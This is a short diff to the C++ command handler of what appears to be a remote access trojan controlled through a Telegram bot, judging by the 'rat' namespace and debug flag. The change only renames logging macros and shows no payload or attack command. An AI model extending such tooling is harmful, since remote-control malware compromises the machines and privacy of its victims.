@@ -46,7 +46,7 @@ void Handler::handleUpdates() {
 
             if (_isUpdateEmpty(this->telegram_update)) {
                 empty_updates_count++;
-                DEBUG_LOG("Empty Update");
+                HANDLER_DEBUG_LOG("Empty Update");
                 this->_dynamicSleep();  // ← Call member function
                 continue;
             }
@@ -54,7 +54,7 @@ void Handler::handleUpdates() {
             empty_updates_count = 0;  // Reset on successful update
 
             if (!this->telegram_update->message.files.empty()) {
-                DEBUG_LOG("Handling uploaded files to the bot");
+                HANDLER_DEBUG_LOG("Handling uploaded files to the bot");
                 this->handleMessageWithUploadedFiles();
                 continue;
             }
@@ -116,7 +116,7 @@ void Handler::dispatchDynamicCommand() {
 }
 
 void Handler::dispatchIntegratedCommand() {
-    DEBUG_LOG("Dispatching commands based on the update {}", this->telegram_update->id);
+    HANDLER_DEBUG_LOG("Dispatching commands based on the update {}", this->telegram_update->id);
     this->parseTelegramMessageToCommand();
     
     for (const auto& handler : command_map) {
@@ -129,8 +129,8 @@ void Handler::dispatchIntegratedCommand() {
 }
 
 } // namespace rat::handler
-#undef DEBUG_LOG
-#undef ERROR_LOG
+#undef HANDLER_DEBUG_LOG
+#undef HANDLER_ERROR_LOG
 #ifdef DEBUG_RAT_HANDLER
     #undef DEBUG_RAT_HANDLER
 #endif
